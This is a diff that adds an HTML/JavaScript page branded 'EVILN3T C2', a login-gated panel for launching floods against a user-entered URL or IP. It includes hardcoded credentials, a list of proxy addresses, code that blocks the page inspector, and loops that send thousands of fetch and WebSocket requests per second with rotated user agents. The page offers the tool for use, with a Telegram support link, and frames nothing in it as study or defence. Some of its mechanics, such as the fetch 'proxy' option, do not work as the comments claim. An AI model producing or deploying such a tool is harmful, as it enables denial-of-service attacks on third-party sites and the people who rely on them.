@@ -1,0 +1,391 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>EVILN3T C2</title>
+    <style>
+          body {
+            font-family: 'Courier New', Courier, monospace;
+            margin: 0;
+            padding: 0;
+            background-image: url('https://c.top4top.io/p_3269ywsl51.gif'); /* Replace with a botnet or hacker image URL */
+            background-size: cover;
+            background-position: center;
+            color: white;
+            text-align: center;
+            padding-top: 50px;
+            height: 100vh;
+            overflow: hidden;
+        }
+
+        h1 {
+            font-size: 60px;
+            color: red; /* Large and red welcome text */
+        }
+
+        .container {
+            margin: 20px auto;
+            width: 80%;
+            max-width: 1000px;
+        }
+
+        /* Username and password labels with inline and bold style */
+        label {
+            display: inline-block;
+            margin-right: 10px;
+            font-weight: bold;
+            font-size: 18px;
+            color: #00cc99;
+            text-align: left;
+            border: 2px solid #00cc99;
+            padding: 10px;
+            border-radius: 5px;
+        }
+
+        .input-container input, .input-container select {
+            padding: 10px;
+            width: 300px;
+            font-size: 16px;
+            border: 2px solid #00cc99;
+            border-radius: 5px;
+            background-color: #333;
+            color: white;
+            margin-bottom: 20px;
+        }
+
+        /* Button Styling */
+        .button {
+            background-color: #ff6600; /* Orange background */
+            color: white;
+            padding: 15px 25px;
+            border: none;
+            font-size: 18px;
+            cursor: pointer;
+            border-radius: 5px;
+            margin-bottom: 20px;
+        }
+
+        .button:hover {
+            background-color: #e65c00; /* Darker orange when hovered */
+        }
+
+        .status {
+            margin-top: 20px;
+            font-size: 18px;
+            color: cyan;
+        }
+
+        .logs {
+            max-height: 400px;
+            overflow-y: auto;
+            background-color: #333;
+            padding: 10px;
+            color: white;
+            font-size: 14px;
+            margin-top: 30px;
+            border-radius: 5px;
+        }
+
+        .log-entry {
+            padding: 5px;
+            margin: 5px 0;
+        }
+
+        .log-entry.start {
+            font-weight: bold;
+            color: green;
+        }
+
+        .log-entry.packet {
+            color: cyan;
+        }
+
+        /* Support button */
+        .support-button {
+            background-color: #0088cc;
+            color: white;
+            padding: 15px 25px;
+            border: none;
+            font-size: 18px;
+            cursor: pointer;
+            border-radius: 5px;
+            margin-top: 20px;
+        }
+
+        .support-button:hover {
+            background-color: #006bb3;
+        }
+
+        /* Adjusting layout for labels, inputs, and text */
+        .label-input-container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            margin: 10px 0;
+        }
+
+        .label-input-container label {
+            width: 100%;
+            text-align: center;
+            margin-bottom: 5px;
+        }
+
+        .label-input-container input {
+            width: 80%;
+            text-align: center;
+        }
+
+        /* Styling for "Transit" or status text */
+        .transit-text {
+            font-size: 20px;
+            color: yellow;
+            margin-top: 20px;
+            font-weight: bold;
+        }
+
+        /* Name display in front of soul design */
+        .name-display {
+            text-align: center;
+            font-size: 24px;
+            font-weight: bold;
+            color: #ff6600;
+            margin-top: 20px;
+        }
+
+        /* New Design for URL Input and Button */
+        .url-input-container input {
+            background-color: black; /* Black background for URL input */
+            color: orange; /* Orange text for the input */
+            border: 2px solid orange; /* Orange border */
+            border-radius: 5px;
+            font-size: 16px;
+            padding: 10px;
+            width: 80%;
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .url-input-container button {
+            background-color: black; /* Black background for the button */
+            color: orange; /* Orange text for the button */
+            padding: 15px 25px;
+            border: 2px solid orange; /* Orange border */
+            font-size: 18px;
+            cursor: pointer;
+            border-radius: 5px;
+            margin-top: 20px;
+        }
+
+        .url-input-container button:hover {
+            background-color: orange; /* Orange background when hovered */
+            color: black; /* Change text color to black on hover */
+        }
+    </style>
+</head>
+<body>
+    <h1>Welcome To EVILN3T C2</h1>
+
+    <!-- Login Form -->
+    <div id="loginForm" class="login-container">
+        <h2 class="glitch" data-text="Please Login">Please Login</h2>
+        <div class="label-input-container">
+            <label for="username">Username</label>
+            <input type="text" id="username" placeholder="Enter your username" />
+        </div>
+
+        <div class="label-input-container">
+            <label for="password">Password</label>
+            <input type="password" id="password" placeholder="Enter your password" />
+        </div>
+
+        <button class="button" onclick="login()">Login</button>
+        <p id="loginError" style="color: red;"></p>
+
+        <a href="https://t.me/eviln3t" target="_blank">
+            <button class="support-button">Support</button>
+        </a>
+    </div>
+
+    <!-- Main Content (hidden initially) -->
+    <div id="mainContent" class="container" style="display: none;">
+        <div class="label-input-container">
+            <select id="attackType">
+                <option value="HTTPS">Attack URL (HTTPS)</option>
+                <option value="TCP">Attack IP (TCP)</option>
+            </select>
+        </div>
+
+        <div class="url-input-container">
+            <input type="text" id="targetInput" placeholder="Enter URL/IP to attack">
+            <button class="button" onclick="startAttack()">Start Attack</button>
+        </div>
+
+        <div class="label-input-container">
+            <input type="number" id="portInput" placeholder="Enter Port Number" value="80">
+        </div>
+
+        <div class="label-input-container">
+            <input type="number" id="requestRateInput" placeholder="Enter Request Rate per Second" value="10000">
+        </div>
+
+        <div class="logs" id="logs"></div>
+    </div>
+
+    <script>
+        const users = {
+            'paradox': 'paradox',
+            'disc': 'omar'
+        };
+
+        // List of proxy servers (for HTTPS)
+        const proxies = [
+    "http://107.162.143.146:80",
+    "http://58.246.58.150:9002",
+    "http://103.247.21.225:2024",
+    "http://51.254.78.223:80",
+    "http://198.49.68.80:80",
+    "http://123.30.154.38:2008",
+    "http://80.249.112.162:80",
+    "http://221.6.139.190:9002",
+    "http://123.30.154.171:7777",
+    "http://103.119.55.232:10001",
+    "http://185.255.123.34:80"
+    // Add more proxies here as needed
+];
+
+        // Function to get a random proxy
+        function getRandomProxy() {
+            return proxies[Math.floor(Math.random() * proxies.length)];
+        }
+
+        document.addEventListener('contextmenu', function(e) {
+            e.preventDefault();
+        });
+
+        document.addEventListener('keydown', function(e) {
+            if (e.ctrlKey && (e.key === 'u' || e.key === 'U')) {
+                e.preventDefault();
+            }
+            if (e.key === 'F12') {
+                e.preventDefault();
+            }
+        });
+
+        function login() {
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+
+            if (users[username] && users[username] === password) {
+                document.getElementById('loginForm').style.display = 'none';
+                document.getElementById('mainContent').style.display = 'block';
+                document.getElementById('loginError').textContent = '';
+            } else {
+                document.getElementById('loginError').textContent = 'Incorrect Password';
+                document.getElementById('loginError').classList.add('error-message');
+            }
+        }
+
+        // Start the attack based on selected option
+        function startAttack() {
+            const attackType = document.getElementById('attackType').value;
+            const target = document.getElementById('targetInput').value;
+            const port = document.getElementById('portInput').value;
+            const requestRate = document.getElementById('requestRateInput').value;
+
+            if (!target || !port || !requestRate) {
+                alert('Please fill out all fields.');
+                return;
+            }
+
+            logMessage(`Attacking started on ${attackType === 'HTTPS' ? 'URL' : 'IP'}: ${target}:${port}`);
+
+            if (attackType === 'HTTPS') {
+                logMessage(`Starting HTTPS attack on URL: ${target}:${port}`);
+                startHttpsAttack(target, port, requestRate);
+            } else if (attackType === 'TCP') {
+                logMessage(`Starting TCP attack on IP: ${target}:${port}`);
+                startTcpAttack(target, port, requestRate);
+            }
+        }
+
+        // Function to send HTTPS requests with proxy
+        function startHttpsAttack(url, port, rate) {
+            const userAgents = [
+                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
+                'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0',
+                'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0'
+            ];
+
+            let count = 0;
+            let interval = setInterval(() => {
+                for (let i = 0; i < rate; i++) {
+                    const randomUserAgent = userAgents[Math.floor(Math.random() * userAgents.length)];
+                    const proxy = getRandomProxy(); // Select a random proxy from the list
+
+                    fetch(`https://${url}:${port}`, {
+                        method: 'GET',
+                        headers: {
+                            'User-Agent': randomUserAgent
+                        },
+                        // Use a proxy by adding it as a mode for fetch if needed
+                        proxy: proxy // This will use the selected proxy
+                    })
+                    .then(response => {
+                        logMessage(`Sent packet to: ${url}:${port}`);
+                    })
+                    .catch(error => {
+                        console.error('Error:', error);
+                    });
+                }
+                count += rate;
+            }, 1000);
+        }
+
+        // Function to send TCP packets using WebSockets with proxy (requires external proxy setup)
+        function startTcpAttack(ip, port, rate) {
+            const userAgents = [
+                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
+                'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0'
+            ];
+
+            let count = 0;
+            let interval = setInterval(() => {
+                for (let i = 0; i < rate; i++) {
+                    const randomUserAgent = userAgents[Math.floor(Math.random() * userAgents.length)];
+                    let socket = new WebSocket(`ws://${ip}:${port}`);
+
+                    socket.onopen = () => {
+                        socket.send("GET / HTTP/1.1\r\nHost: " + ip + "\r\nUser-Agent: " + randomUserAgent + "\r\n\r\n");
+                        logMessage(`Sent packet to: ${ip}:${port}`);
+                    };
+
+                    socket.onerror = (error) => {
+                        console.error(`Error sending TCP packet to ${ip}:${port}`);
+                    };
+                }
+                count += rate;
+            }, 1000);
+        }
+
+        // Log messages to the logs section
+        function logMessage(message) {
+            const logsContainer = document.getElementById('logs');
+            const logEntry = document.createElement('div');
+            logEntry.classList.add('log-entry');
+
+            if (message.includes('Attacking started')) {
+                logEntry.classList.add('start');
+            } else {
+                logEntry.classList.add('packet');
+            }
+
+            logEntry.textContent = message;
+            logsContainer.appendChild(logEntry);
+
+            logsContainer.scrollTop = logsContainer.scrollHeight;
+        }
+    </script>
+</body>
+</html>
